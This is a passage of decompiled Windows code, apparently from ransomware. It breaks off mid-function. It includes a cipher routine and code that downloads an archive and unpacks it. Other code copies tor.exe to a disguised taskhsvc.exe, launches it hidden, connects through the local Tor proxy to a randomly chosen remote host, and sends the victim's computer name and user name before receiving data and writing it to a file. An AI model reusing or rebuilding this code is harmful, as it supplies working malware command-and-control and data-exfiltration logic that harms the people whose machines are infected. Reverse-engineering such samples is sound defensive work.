        pbVar8[2] = (&DAT_004170b0)[*(byte *)((int)this + (iVar11 % iVar5) * 4 + 0x455)] ^
                    (byte)((uint)uVar1 >> 8);
        pbVar8[3] = (&DAT_004170b0)
                    [*(uint *)((int)this + ((iVar2 + iVar11) % iVar5) * 4 + 0x454) & 0xff] ^
                    (byte)uVar1;
        pbVar8 = pbVar8 + 4;
        param_1 = (uint *)((int)param_1 + 1);
        param_2 = param_2 + 4;
        iVar11 = iVar11 + 1;
      } while ((int)param_1 < iVar5);
    }
    return;
  }
  FUN_0040a9d0(this,param_1,param_2);
  return;
}

void __thiscall FUN_0040b3c0(void *this,uint *param_1,byte *param_2,uint param_3,uint param_4)

{
  byte *pbVar1;
  uint *puVar2;
  uint uVar3;
  uint uVar4;
  uint *puVar5;
  int iVar6;
  uint *puVar7;
  bool bVar8;
  exception local_c [12];
  
  puVar5 = param_1;
  if (*(char *)((int)this + 4) == '\0') {
    exception(local_c,&this_004213a8);
                    // WARNING: Subroutine does not return
    _CxxThrowException(local_c,(ThrowInfo *)&pThrowInfo_0041c9c0);
  }
  if ((param_3 != 0) && (uVar4 = *(uint *)((int)this + 0x3cc), param_3 % uVar4 == 0)) {
    if (param_4 == 1) {
      param_4 = 0;
      if (param_3 / uVar4 != 0) {
        do {
          FUN_0040b0c0(this,param_1,param_2);
          if (*(char *)((int)this + 4) == '\0') {
            exception(local_c,&this_004213a8);
                    // WARNING: Subroutine does not return
            _CxxThrowException(local_c,(ThrowInfo *)&pThrowInfo_0041c9c0);
          }
          iVar6 = 0;
          if (0 < *(int *)((int)this + 0x3cc)) {
            pbVar1 = param_2;
            do {
              *pbVar1 = *pbVar1 ^ pbVar1[(int)this + (0x3f0 - (int)param_2)];
              pbVar1 = pbVar1 + 1;
              iVar6 = iVar6 + 1;
            } while (iVar6 < *(int *)((int)this + 0x3cc));
          }
          uVar4 = *(uint *)((int)this + 0x3cc);
          uVar3 = uVar4 >> 2;
          puVar5 = param_1;
          puVar2 = (uint *)((int)this + 0x3f0);
          while (uVar3 != 0) {
            uVar3 = uVar3 - 1;
            *puVar2 = *puVar5;
            puVar5 = puVar5 + 1;
            puVar2 = puVar2 + 1;
          }
          uVar4 = uVar4 & 3;
          while (uVar4 != 0) {
            uVar4 = uVar4 - 1;
            *(undefined *)puVar2 = *(undefined *)puVar5;
            puVar5 = (uint *)((int)puVar5 + 1);
            puVar2 = (uint *)((int)puVar2 + 1);
          }
          uVar4 = *(uint *)((int)this + 0x3cc);
          param_1 = (uint *)((int)param_1 + uVar4);
          param_2 = param_2 + uVar4;
          param_4 = param_4 + 1;
        } while (param_4 < param_3 / uVar4);
      }
    }
    else {
      bVar8 = param_4 == 2;
      param_4 = 0;
      if (bVar8) {
        param_1 = (uint *)param_2;
        if (param_3 / uVar4 != 0) {
          do {
            FUN_0040adc0(this,(uint *)((int)this + 0x3f0),(byte *)param_1);
            if (*(char *)((int)this + 4) == '\0') {
              exception(local_c,&this_004213a8);
                    // WARNING: Subroutine does not return
              _CxxThrowException(local_c,(ThrowInfo *)&pThrowInfo_0041c9c0);
            }
            iVar6 = 0;
            puVar2 = param_1;
            if (0 < *(int *)((int)this + 0x3cc)) {
              do {
                *(byte *)puVar2 = *(byte *)puVar2 ^ *(byte *)(iVar6 + (int)puVar5);
                puVar2 = (uint *)((int)puVar2 + 1);
                iVar6 = iVar6 + 1;
              } while (iVar6 < *(int *)((int)this + 0x3cc));
            }
            uVar4 = *(uint *)((int)this + 0x3cc);
            uVar3 = uVar4 >> 2;
            puVar2 = puVar5;
            puVar7 = (uint *)((int)this + 0x3f0);
            while (uVar3 != 0) {
              uVar3 = uVar3 - 1;
              *puVar7 = *puVar2;
              puVar2 = puVar2 + 1;
              puVar7 = puVar7 + 1;
            }
            uVar4 = uVar4 & 3;
            while (uVar4 != 0) {
              uVar4 = uVar4 - 1;
              *(undefined *)puVar7 = *(undefined *)puVar2;
              puVar2 = (uint *)((int)puVar2 + 1);
              puVar7 = (uint *)((int)puVar7 + 1);
            }
            uVar4 = *(uint *)((int)this + 0x3cc);
            param_1 = (uint *)((int)param_1 + uVar4);
            puVar5 = (uint *)((int)puVar5 + uVar4);
            param_4 = param_4 + 1;
          } while (param_4 < param_3 / uVar4);
          return;
        }
      }
      else {
        if (param_3 / uVar4 != 0) {
          do {
            FUN_0040b0c0(this,param_1,param_2);
            uVar4 = *(uint *)((int)this + 0x3cc);
            param_1 = (uint *)((int)param_1 + uVar4);
            param_2 = param_2 + uVar4;
            param_4 = param_4 + 1;
          } while (param_4 < param_3 / uVar4);
          return;
        }
      }
    }
    return;
  }
  exception(local_c,&PTR_DAT_004213ac);
                    // WARNING: Subroutine does not return
  _CxxThrowException(local_c,(ThrowInfo *)&pThrowInfo_0041c9c0);
}

void __cdecl FUN_0040b620(LPCWSTR param_1,int param_2)

{
  HWND hWnd;
  
  hWnd = FindWindowW((LPCWSTR)0x0,param_1);
  if (hWnd != (HWND)0x0) {
    ShowWindow(hWnd,5);
    SetWindowPos(hWnd,(HWND)0xffffffff,0,0,0,0,0x43);
    SetWindowPos(hWnd,(HWND)0xfffffffe,0,0,0,0,0x43);
    SetForegroundWindow(hWnd);
    SetFocus(hWnd);
    SetActiveWindow(hWnd);
    BringWindowToTop(hWnd);
    if (param_2 != 0) {
      ExitProcess(0);
    }
  }
  return;
}

uint __cdecl FUN_0040b6a0(LPCSTR param_1,LPCSTR param_2,char *param_3)

{
  char *pcVar1;
  int *piVar2;
  uint uVar3;
  undefined4 uVar4;
  int iVar5;
  char *pcVar6;
  undefined4 *puVar7;
  char *local_334;
  undefined4 local_330 [74];
  undefined4 local_208 [130];
  
  CreateDirectoryA(param_1,(LPSECURITY_ATTRIBUTES)0x0);
  piVar2 = (int *)FUN_00412920(param_2,param_3);
  if (piVar2 == (int *)0x0) {
    uVar3 = DeleteFileA(param_2);
    return uVar3 & 0xffffff00;
  }
  iVar5 = 0x4a;
  local_334 = (char *)0x0;
  puVar7 = local_330;
  while (iVar5 != 0) {
    iVar5 = iVar5 + -1;
    *puVar7 = 0;
    puVar7 = puVar7 + 1;
  }
  uVar3 = FUN_00412940(piVar2,(char *)0xffffffff,&local_334);
  pcVar1 = local_334;
  if ((int)local_334 < 1) {
    return uVar3 & 0xffffff00;
  }
  pcVar6 = (char *)0x0;
  if (0 < (int)local_334) {
    do {
      FUN_00412940(piVar2,pcVar6,&local_334);
      sprintf((char *)local_208,s__s__s_004214d4,param_1,local_330);
      FUN_004129e0(piVar2,pcVar6,local_208);
      pcVar6 = pcVar6 + 1;
    } while ((int)pcVar6 < (int)pcVar1);
  }
  uVar4 = FUN_00412a00(piVar2);
  return CONCAT31((int3)((uint)uVar4 >> 8),1);
}

uint __cdecl FUN_0040b780(LPCSTR param_1,LPCSTR param_2)

{
  char cVar1;
  uint uVar2;
  HRESULT HVar3;
  BOOL BVar4;
  int iVar5;
  LPCSTR pCVar6;
  undefined4 *puVar7;
  CHAR local_104;
  undefined4 local_103;
  
  CreateDirectoryA(param_1,(LPSECURITY_ATTRIBUTES)0x0);
  iVar5 = -1;
  uVar2 = 0;
  pCVar6 = param_2;
  do {
    if (iVar5 == 0) break;
    iVar5 = iVar5 + -1;
    cVar1 = *pCVar6;
    pCVar6 = pCVar6 + 1;
  } while (cVar1 != '\0');
  if (iVar5 != -2) {
    iVar5 = 0x40;
    local_104 = (CHAR)this_00421798;
    puVar7 = &local_103;
    while (iVar5 != 0) {
      iVar5 = iVar5 + -1;
      *puVar7 = 0;
      puVar7 = puVar7 + 1;
    }
    *(undefined2 *)puVar7 = 0;
    *(undefined *)((int)puVar7 + 2) = 0;
    GetTempFileNameA(param_1,(LPCSTR)&lpPrefixString_004214dc,0,&local_104);
    DeleteUrlCacheEntry(param_2);
    HVar3 = URLDownloadToFileA((LPUNKNOWN)0x0,param_2,&stack0xfffffef8,0,(LPBINDSTATUSCALLBACK)0x0);
    if (HVar3 == 0) {
      uVar2 = FUN_0040b6a0(param_1,&stack0xfffffef8,param_2);
      if ((char)uVar2 != '\0') {
        BVar4 = DeleteFileA(&stack0xfffffef8);
        return CONCAT31((int3)((uint)BVar4 >> 8),1);
      }
    }
    uVar2 = DeleteFileA(&stack0xfffffef8);
  }
  return uVar2 & 0xffffff00;
}

uint FUN_0040b840(void)

{
  DWORD DVar1;
  uint uVar2;
  BOOL BVar3;
  int iVar4;
  undefined4 *puVar5;
  LPSTR *ppCVar6;
  _PROCESS_INFORMATION local_464;
  _STARTUPINFOA local_454;
  CHAR local_410;
  undefined4 local_40f;
  CHAR local_208;
  undefined4 local_207;
  
  local_410 = (char)this_00421798;
  iVar4 = 0x81;
  puVar5 = &local_40f;
  while (iVar4 != 0) {
    iVar4 = iVar4 + -1;
    *puVar5 = 0;
    puVar5 = puVar5 + 1;
  }
  *(undefined2 *)puVar5 = 0;
  *(undefined *)((int)puVar5 + 2) = 0;
  sprintf(&local_410,s__s__s__s_004214e8,s_TaskData_004214f4,&DAT_00421500,s_taskhsvc_exe_00421504);
  DVar1 = GetFileAttributesA(&local_410);
  if (DVar1 == 0xffffffff) {
    uVar2 = FUN_0040b6a0(s_TaskData_004214f4,(LPCSTR)&_Dest_004220e4,(char *)0x0);
    if ((char)uVar2 == '\0') {
      uVar2 = FUN_0040b780(s_TaskData_004214f4,(LPCSTR)&_Dest_00422148);
      if ((char)uVar2 == '\0') {
        uVar2 = FUN_0040b780(s_TaskData_004214f4,(LPCSTR)&_Dest_004221ac);
        if ((char)uVar2 == '\0') {
          return uVar2;
        }
      }
    }
    iVar4 = 0x81;
    local_208 = (char)this_00421798;
    puVar5 = &local_207;
    while (iVar4 != 0) {
      iVar4 = iVar4 + -1;
      *puVar5 = 0;
      puVar5 = puVar5 + 1;
    }
    *(undefined2 *)puVar5 = 0;
    *(undefined *)((int)puVar5 + 2) = 0;
    sprintf(&local_208,s__s__s__s_004214e8,s_TaskData_004214f4,&DAT_00421500,s_tor_exe_004214e0);
    DVar1 = GetFileAttributesA(&local_208);
    if (DVar1 == 0xffffffff) {
      return 0xffffff00;
    }
    CopyFileA(&local_208,&local_410,0);
  }
  iVar4 = 0x10;
  local_454.cb = 0x44;
  local_464.hProcess = (HANDLE)0x0;
  ppCVar6 = &local_454.lpReserved;
  while (iVar4 != 0) {
    iVar4 = iVar4 + -1;
    *ppCVar6 = (LPSTR)0x0;
    ppCVar6 = ppCVar6 + 1;
  }
  local_464.hThread = (HANDLE)0x0;
  local_464.dwProcessId = 0;
  local_464.dwThreadId = 0;
  local_454.wShowWindow = 0;
  local_454.dwFlags = 1;
  BVar3 = CreateProcessA((LPCSTR)0x0,&local_410,(LPSECURITY_ATTRIBUTES)0x0,
                         (LPSECURITY_ATTRIBUTES)0x0,0,0x8000000,(LPVOID)0x0,(LPCSTR)0x0,
                         (LPSTARTUPINFOA)&local_454,(LPPROCESS_INFORMATION)&local_464);
  if (BVar3 == 0) {
    return 0;
  }
  DVar1 = WaitForSingleObject(local_464.hProcess,5000);
  if (DVar1 == 0x102) {
    WaitForSingleObject(local_464.hProcess,30000);
  }
  CloseHandle(local_464.hProcess);
  BVar3 = CloseHandle(local_464.hThread);
  return CONCAT31((int3)((uint)BVar3 >> 8),1);
}

int FUN_0040ba10(void)

{
  int iVar1;
  uint uVar2;
  
  iVar1 = (**(code **)(*DAT_00422210 + 4))(s_127_0_0_1_00421514,0x235a,1);
  if (iVar1 == 0) {
    return 0;
  }
  uVar2 = FUN_0040b840();
  if ((char)uVar2 == '\0') {
    return -1;
  }
  iVar1 = (**(code **)(*DAT_00422210 + 4))(s_127_0_0_1_00421514,0x235a,1);
  return -(uint)(iVar1 != 0);
}

undefined4 FUN_0040ba60(undefined4 param_1)

{
  int iVar1;
  undefined4 *puVar2;
  undefined local_20;
  undefined4 local_1f [7];
  
  iVar1 = 7;
  local_20 = 0;
  puVar2 = local_1f;
  while (iVar1 != 0) {
    iVar1 = iVar1 + -1;
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  *(undefined2 *)puVar2 = 0;
  FUN_0040d5a0(DAT_00422210,(undefined4 *)&local_20);
  iVar1 = FUN_0040d8c0(DAT_00422210,s_127_0_0_1_00421514,0x235a);
  if (iVar1 == 0) {
    iVar1 = (**(code **)(*DAT_00422210 + 0x10))(2,0,1,0);
    if (iVar1 != 0) {
      (**(code **)(*DAT_00422210 + 0xc))();
      return 0xffffffff;
    }
    return 0;
  }
  (**(code **)(*DAT_00422210 + 0xc))();
  return 0xffffffff;
}

// WARNING: Could not reconcile some variable overlaps

int __cdecl FUN_0040baf0(char *param_1)

{
  char cVar1;
  byte bVar2;
  int **ppiVar3;
  int iVar4;
  byte *pbVar5;
  DWORD _Seed;
  int *piVar6;
  uint uVar7;
  uint uVar8;
  int **ppiVar9;
  undefined4 *puVar10;
  char *pcVar11;
  undefined4 *puVar12;
  int *piVar13;
  undefined4 *in_FS_OFFSET;
  bool bVar14;
  undefined auStack1156 [4];
  int **ppiStack1152;
  uint uStack1148;
  int **ppiStack1144;
  undefined auStack1140 [16];
  int *piStack1124;
  undefined4 uStack1120;
  int iStack1116;
  int aiStack1112 [25];
  undefined4 uStack1012;
  undefined4 local_c;
  undefined *puStack8;
  undefined4 uStack4;
  
  local_c = *in_FS_OFFSET;
  uStack4 = 0xffffffff;
  puStack8 = &LAB_00414286;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  iVar4 = FUN_0040ba10();
  if (iVar4 == 0) {
    (**(code **)(*DAT_00422210 + 0xc))();
    iVar4 = -1;
    pcVar11 = &DAT_00422214;
    do {
      if (iVar4 == 0) break;
      iVar4 = iVar4 + -1;
      cVar1 = *pcVar11;
      pcVar11 = pcVar11 + 1;
    } while (cVar1 != '\0');
    if ((iVar4 != -2) && (iVar4 = FUN_0040ba60(&DAT_00422214), iVar4 == 0)) goto LAB_0040bdf8;
    ppiStack1152 = (int **)FUN_0040c8f0((void **)0x0,(void *)0x0);
    uStack1148 = 0;
    uVar7 = 0xffffffff;
    do {
      pcVar11 = param_1;
      if (uVar7 == 0) break;
      uVar7 = uVar7 - 1;
      pcVar11 = param_1 + 1;
      cVar1 = *param_1;
      param_1 = pcVar11;
    } while (cVar1 != '\0');
    uVar7 = ~uVar7;
    uStack4 = 0;
    uVar8 = uVar7 >> 2;
    puVar10 = (undefined4 *)(pcVar11 + -uVar7);
    puVar12 = &uStack1012;
    while (uVar8 != 0) {
      uVar8 = uVar8 - 1;
      *puVar12 = *puVar10;
      puVar10 = puVar10 + 1;
      puVar12 = puVar12 + 1;
    }
    uVar7 = uVar7 & 3;
    while (uVar7 != 0) {
      uVar7 = uVar7 - 1;
      *(undefined *)puVar12 = *(undefined *)puVar10;
      puVar10 = (undefined4 *)((int)puVar10 + 1);
      puVar12 = (undefined4 *)((int)puVar12 + 1);
    }
    puVar10 = (undefined4 *)strtok((char *)&uStack1012,(char *)&_Delim_00421520);
    iVar4 = 0;
    while (puVar10 != (undefined4 *)0x0) {
      if (0 < iVar4) {
        FUN_0040c7b0(auStack1140,'\0');
        uVar7 = 0xffffffff;
        puVar12 = puVar10;
        do {
          if (uVar7 == 0) break;
          uVar7 = uVar7 - 1;
          cVar1 = *(char *)puVar12;
          puVar12 = (undefined4 *)((int)puVar12 + 1);
        } while (cVar1 != '\0');
        FUN_0040c920(auStack1140,puVar10,~uVar7 - 1);
        uStack4._0_1_ = 1;
        FUN_0040c800(auStack1156,&ppiStack1144,ppiStack1152,auStack1140);
        uStack4 = (uint)uStack4._1_3_ << 8;
        FUN_0040c7b0(auStack1140,'\x01');
      }
      puVar10 = (undefined4 *)strtok((char *)0x0,(char *)&_Delim_00421520);
      iVar4 = iVar4 + 1;
    }
    iVar4 = -1;
    pcVar11 = &DAT_00422214;
    do {
      if (iVar4 == 0) break;
      iVar4 = iVar4 + -1;
      cVar1 = *pcVar11;
      pcVar11 = pcVar11 + 1;
    } while (cVar1 != '\0');
    if (iVar4 == -2) {
LAB_0040bc7e:
      iVar4 = FUN_0040ba60(&uStack1012);
      if (iVar4 == 0) {
        uVar7 = 0xffffffff;
        puVar10 = &uStack1012;
        do {
          puVar12 = puVar10;
          if (uVar7 == 0) break;
          uVar7 = uVar7 - 1;
          puVar12 = (undefined4 *)((int)puVar10 + 1);
          cVar1 = *(char *)puVar10;
          puVar10 = puVar12;
        } while (cVar1 != '\0');
        uVar7 = ~uVar7;
        uVar8 = uVar7 >> 2;
        puVar10 = (undefined4 *)((int)puVar12 - uVar7);
        puVar12 = (undefined4 *)&DAT_00422214;
        while (uVar8 != 0) {
          uVar8 = uVar8 - 1;
          *puVar12 = *puVar10;
          puVar10 = puVar10 + 1;
          puVar12 = puVar12 + 1;
        }
        uStack4 = 0xffffffff;
        uVar7 = uVar7 & 3;
        while (uVar7 != 0) {
          uVar7 = uVar7 - 1;
          *(undefined *)puVar12 = *(undefined *)puVar10;
          puVar10 = (undefined4 *)((int)puVar10 + 1);
          puVar12 = (undefined4 *)((int)puVar12 + 1);
        }
        FUN_0040c860(auStack1156,(int **)&ppiStack1144,*ppiStack1152,(int *)ppiStack1152);
        operator_delete(ppiStack1152);
        iVar4 = 0;
        goto LAB_0040bdf8;
      }
    }
    else {
      puVar10 = &uStack1012;
      pbVar5 = &DAT_00422214;
      do {
        bVar2 = *pbVar5;
        bVar14 = bVar2 < *(byte *)puVar10;
        if (bVar2 != *(byte *)puVar10) {
LAB_0040bc75:
          iVar4 = (1 - (uint)bVar14) - (uint)(bVar14 != false);
          goto LAB_0040bc7a;
        }
        if (bVar2 == 0) break;
        bVar2 = pbVar5[1];
        bVar14 = bVar2 < *(byte *)((int)puVar10 + 1);
        if (bVar2 != *(byte *)((int)puVar10 + 1)) goto LAB_0040bc75;
        pbVar5 = pbVar5 + 2;
        puVar10 = (undefined4 *)((int)puVar10 + 2);
      } while (bVar2 != 0);
      iVar4 = 0;
LAB_0040bc7a:
      if (iVar4 != 0) goto LAB_0040bc7e;
    }
    _Seed = GetTickCount();
    srand(_Seed);
    uVar7 = uStack1148;
    while (uStack1148 = uVar7, uVar7 != 0) {
      uVar8 = rand();
      uVar8 = uVar8 % uVar7;
      ppiVar9 = (int **)*ppiStack1152;
      uVar7 = uVar8;
      if (0 < (int)uVar8) {
        uVar7 = 0;
        do {
          ppiVar9 = (int **)*ppiVar9;
          uVar8 = uVar8 - 1;
        } while (uVar8 != 0);
      }
      if ((int)uVar7 < 0) {
        iVar4 = -uVar7;
        do {
          ppiVar9 = (int **)ppiVar9[1];
          iVar4 = iVar4 + -1;
        } while (iVar4 != 0);
      }
      piVar6 = ppiVar9[3];
      if (piVar6 == (int *)0x0) {
        piVar6 = &DAT_0041ba38;
      }
      uVar7 = 0xffffffff;
      do {
        piVar13 = piVar6;
        if (uVar7 == 0) break;
        uVar7 = uVar7 - 1;
        piVar13 = (int *)((int)piVar6 + 1);
        cVar1 = *(char *)piVar6;
        piVar6 = piVar13;
      } while (cVar1 != '\0');
      uVar7 = ~uVar7;
      uVar8 = uVar7 >> 2;
      piVar6 = (int *)((int)piVar13 - uVar7);
      piVar13 = aiStack1112;
      while (uVar8 != 0) {
        uVar8 = uVar8 - 1;
        *piVar13 = *piVar6;
        piVar6 = piVar6 + 1;
        piVar13 = piVar13 + 1;
      }
      uVar7 = uVar7 & 3;
      while (uVar7 != 0) {
        uVar7 = uVar7 - 1;
        *(undefined *)piVar13 = *(undefined *)piVar6;
        piVar6 = (int *)((int)piVar6 + 1);
        piVar13 = (int *)((int)piVar13 + 1);
      }
      iVar4 = FUN_0040ba60(aiStack1112);
      ppiVar3 = ppiStack1152;
      if (iVar4 == 0) {
        uVar7 = 0xffffffff;
        uStack4 = 0xffffffff;
        piVar6 = aiStack1112;
        goto code_r0x0040be25;
      }
      (**(code **)(*DAT_00422210 + 0xc))();
      *(int **)ppiVar9[1] = *ppiVar9;
      *(int **)(*ppiVar9 + 1) = ppiVar9[1];
      FUN_0040ce50(ppiVar9 + 2,0);
      operator_delete(ppiVar9);
      uStack1148 = uStack1148 - 1;
      Sleep(3000);
      uVar7 = uStack1148;
    }
    uStack4 = 0xffffffff;
    FUN_0040c860(auStack1156,&piStack1124,*ppiStack1152,(int *)ppiStack1152);
    operator_delete(ppiStack1152);
  }
  iVar4 = -1;
LAB_0040bdf8:
  *in_FS_OFFSET = local_c;
  return iVar4;
  while( true ) {
    uVar7 = uVar7 - 1;
    piVar13 = (int *)((int)piVar6 + 1);
    cVar1 = *(char *)piVar6;
    piVar6 = piVar13;
    if (cVar1 == '\0') break;
code_r0x0040be25:
    piVar13 = piVar6;
    if (uVar7 == 0) break;
  }
  uVar7 = ~uVar7;
  uVar8 = uVar7 >> 2;
  piVar6 = (int *)((int)piVar13 - uVar7);
  piVar13 = (int *)&DAT_00422214;
  while (uVar8 != 0) {
    uVar8 = uVar8 - 1;
    *piVar13 = *piVar6;
    piVar6 = piVar6 + 1;
    piVar13 = piVar13 + 1;
  }
  uVar7 = uVar7 & 3;
  while (uVar7 != 0) {
    uVar7 = uVar7 - 1;
    *(undefined *)piVar13 = *(undefined *)piVar6;
    piVar6 = (int *)((int)piVar6 + 1);
    piVar13 = (int *)((int)piVar13 + 1);
  }
  ppiStack1144 = (int **)*ppiStack1152;
  while (ppiStack1144 != ppiVar3) {
    ppiVar9 = (int **)FUN_00402d90(&ppiStack1144,&uStack1120);
    FUN_0040c740(auStack1156,&iStack1116,*ppiVar9);
  }
  operator_delete(ppiStack1152);
  iVar4 = 0;
  goto LAB_0040bdf8;
}

undefined4 __cdecl FUN_0040be90(char *param_1,char *param_2,char *param_3)

{
  strncpy((char *)&_Dest_004220e4,param_1,99);
  strncpy((char *)&_Dest_00422148,param_2,99);
  strncpy((char *)&_Dest_004221ac,param_3,99);
  return 0;
}

undefined4 __cdecl FUN_0040bed0(char *param_1,undefined4 *param_2,undefined param_3,void *param_4)

{
  code **ppcVar1;
  int iVar2;
  undefined4 *puVar3;
  undefined4 *in_FS_OFFSET;
  undefined local_26d;
  DWORD local_26c;
  undefined4 *local_268;
  CHAR local_264;
  undefined4 local_263;
  undefined local_23c;
  CHAR local_138;
  undefined4 local_137;
  undefined4 local_c;
  undefined *puStack8;
  undefined4 local_4;
  
  ppcVar1 = DAT_00422210;
  local_c = *in_FS_OFFSET;
  local_4 = 0xffffffff;
  puStack8 = &LAB_0041429e;
  *(undefined4 **)in_FS_OFFSET = &local_c;
  if (ppcVar1 != (code **)0x0) {
    (**(code **)(*ppcVar1 + 0xc))();
    if (DAT_00422210 != (code **)0x0) {
      (**(code **)*DAT_00422210)(1);
    }
  }
  local_268 = (undefined4 *)operator_new(0x2c);
  local_4 = 0;
  if (local_268 == (undefined4 *)0x0) {
    DAT_00422210 = (code **)0x0;
  }
  else {
    DAT_00422210 = (code **)FUN_0040d5e0(local_268);
  }
  local_4 = 0xffffffff;
  if (DAT_00422210 == (code **)0x0) {
    *in_FS_OFFSET = local_c;
    return 0xffffffff;
  }
  iVar2 = FUN_0040baf0(param_1);
  if (iVar2 != 0) {
    *in_FS_OFFSET = local_c;
    return 0xffffffff;
  }
  local_264 = (CHAR)this_00421798;
  iVar2 = 0x4a;
  puVar3 = &local_263;
  while (iVar2 != 0) {
    iVar2 = iVar2 + -1;
    *puVar3 = 0;
    puVar3 = puVar3 + 1;
  }
  *(undefined2 *)puVar3 = 0;
  *(undefined *)((int)puVar3 + 2) = 0;
  local_26c = 299;
  GetComputerNameA(&local_264,&local_26c);
  local_138 = (CHAR)this_00421798;
  iVar2 = 0x4a;
  puVar3 = &local_137;
  while (iVar2 != 0) {
    iVar2 = iVar2 + -1;
    *puVar3 = 0;
    puVar3 = puVar3 + 1;
  }
  *(undefined2 *)puVar3 = 0;
  *(undefined *)((int)puVar3 + 2) = 0;
  local_23c = 0;
  local_26c = 299;
  GetUserNameA(&local_138,&local_26c);
  FUN_0040dc00(param_4,param_2,(char *)0x8);
  FUN_0040dd00(param_4,(undefined4 *)&local_264);
  local_26d = param_3;
  FUN_0040dc00(param_4,(undefined4 *)&local_26d,(char *)0x1);
  FUN_0040dd00(param_4,(undefined4 *)&local_138);
  *in_FS_OFFSET = local_c;
  return 0;
}

WPARAM FUN_0040c060(void)

{
  int iVar1;
  undefined4 uVar2;
  WPARAM wParam;
  undefined4 *in_FS_OFFSET;
  undefined4 in_stack_000023fc;
  char *in_stack_0000240c;
  undefined4 *in_stack_00002410;
  undefined4 *in_stack_00002414;
  HWND in_stack_00002418;
  char cVar3;
  undefined4 uStack12;
  undefined *puStack8;
  undefined4 local_4;
  
  uStack12 = *in_FS_OFFSET;
  local_4 = 0xffffffff;
  puStack8 = &LAB_004142bb;
  *(undefined4 **)in_FS_OFFSET = &uStack12;
  FUN_00413060();
  FUN_0040dbb0(&local_4,0x1000);
  wParam = 0xffffffff;
  iVar1 = FUN_0040bed0(in_stack_0000240c,in_stack_00002410,0xb,&local_4);
  if (iVar1 == 0) {
    if (in_stack_00002418 != (HWND)0x0) {
      SendMessageA(in_stack_00002418,20000,0,0);
    }
    FUN_0040dd00(&local_4,in_stack_00002414);
    iVar1 = *DAT_00422210;
    FUN_0040dd40((int)&local_4);
    uVar2 = FUN_0040dd30((int)&local_4);
    cVar3 = (char)((uint)uVar2 >> 0x18);
    iVar1 = (**(code **)(iVar1 + 0x18))();
    if (iVar1 < 0) {
      if (in_stack_00002418 != (HWND)0x0) {
        SendMessageA(in_stack_00002418,0x4e21,0xffffffff,0);
      }
      (**(code **)(*DAT_00422210 + 0xc))();
      FUN_0040dbf0(&local_4);
      wParam = 0xffffffff;
      goto LAB_0040c221;
    }
    if (in_stack_00002418 != (HWND)0x0) {
      SendMessageA(in_stack_00002418,0x4e21,0,0);
    }
    iVar1 = (**(code **)(*DAT_00422210 + 0x1c))();
    if (iVar1 < 0) {
      if (in_stack_00002418 != (HWND)0x0) {
        SendMessageA(in_stack_00002418,0x4e22,0xffffffff,0);
      }
      (**(code **)(*DAT_00422210 + 0xc))();
      FUN_0040dbf0(&local_4);
      wParam = 0xffffffff;
      goto LAB_0040c221;
    }
    if (cVar3 == '\a') {
      wParam = 0;
    }
    if (in_stack_00002418 != (HWND)0x0) {
      SendMessageA(in_stack_00002418,0x4e22,wParam,0);
    }
    (**(code **)(*DAT_00422210 + 0xc))();
  }
  else {
    if (in_stack_00002418 != (HWND)0x0) {
      SendMessageA(in_stack_00002418,20000,0xffffffff,0);
    }
  }
  FUN_0040dbf0(&local_4);
LAB_0040c221:
  *in_FS_OFFSET = in_stack_000023fc;
  return wParam;
}

// WARNING: Could not reconcile some variable overlaps

WPARAM FUN_0040c240(void)

{
  int iVar1;
  size_t _Count;
  undefined4 uVar2;
  FILE *_File;
  WPARAM wParam;
  uint *in_FS_OFFSET;
  uint in_stack_00002400;
  char *in_stack_00002410;
  undefined4 *in_stack_00002414;
  undefined4 *in_stack_00002418;
  undefined4 *in_stack_00002420;
  char *in_stack_00002424;
  undefined4 *in_stack_00002428;
  undefined4 *in_stack_0000242c;
  undefined in_stack_00002430;
  HWND in_stack_00002438;
  char cVar3;
  undefined4 uStack12;
  undefined *puStack8;
  char *local_4;
  
  local_4 = (char *)0xffffffff;
  uStack12 = *in_FS_OFFSET;
  puStack8 = &DAT_004142db;
  *(undefined **)in_FS_OFFSET = &uStack12;
  FUN_00413060();
  FUN_0040dbb0(register0x00000010,0x1000);
  wParam = 0xffffffff;
  iVar1 = FUN_0040bed0(in_stack_00002410,in_stack_00002414,0xc,register0x00000010);
  if (iVar1 == 0) {
    if (in_stack_00002438 != (HWND)0x0) {
      SendMessageA(in_stack_00002438,20000,0,0);
    }
    FUN_0040dc00(register0x00000010,in_stack_00002418,(char *)0x8);
    FUN_0040dc00(register0x00000010,&local_4,(char *)0x4);
    FUN_0040dd00(register0x00000010,in_stack_00002428);
    FUN_0040dd00(register0x00000010,in_stack_0000242c);
    uStack12._0_3_ = CONCAT12(in_stack_00002430,(undefined2)uStack12);
    uStack12 = uStack12 & 0xff000000 | (uint)(uint3)uStack12;
    FUN_0040dc00(register0x00000010,(undefined4 *)(&uStack12 + 2),(char *)0x1);
    local_4 = in_stack_00002424;
    FUN_0040dc00(register0x00000010,&local_4,(char *)0x4);
    FUN_0040dc00(register0x00000010,in_stack_00002420,in_stack_00002424);
    iVar1 = *DAT_00422210;
    _Count = FUN_0040dd40((int)register0x00000010);
    uVar2 = FUN_0040dd30((int)register0x00000010);
    cVar3 = (char)((uint)uVar2 >> 0x18);
    iVar1 = (**(code **)(iVar1 + 0x18))();
    if (iVar1 < 0) {
      if (in_stack_00002438 != (HWND)0x0) {
        SendMessageA(in_stack_00002438,0x4e21,0xffffffff,0);
      }
      (**(code **)(*DAT_00422210 + 0xc))();
      FUN_0040dbf0((undefined4 *)register0x00000010);
      wParam = 0xffffffff;
      goto LAB_0040c4cc;
    }
    if (in_stack_00002438 != (HWND)0x0) {
      SendMessageA(in_stack_00002438,0x4e21,0,0);
    }
    iVar1 = (**(code **)(*DAT_00422210 + 0x1c))();
    if (iVar1 < 0) {
      if (in_stack_00002438 != (HWND)0x0) {
        SendMessageA(in_stack_00002438,0x4e22,0xffffffff,0);
      }
      (**(code **)(*DAT_00422210 + 0xc))();
      FUN_0040dbf0((undefined4 *)register0x00000010);
      wParam = 0xffffffff;
      goto LAB_0040c4cc;
    }
    if (((cVar3 == '\a') && (wParam = 0, 0 < (int)_Count)) &&
       (_File = fopen((char *)in_stack_00002418,(char *)&_Mode_0041fda8), _File != (FILE *)0x0)) {
      fwrite(&stack0x00000ff8,1,_Count,_File);
      fclose(_File);
      wParam = 1;
    }
    if (in_stack_00002438 != (HWND)0x0) {
      SendMessageA(in_stack_00002438,0x4e22,wParam,0);
    }
    (**(code **)(*DAT_00422210 + 0xc))();
  }
  else {
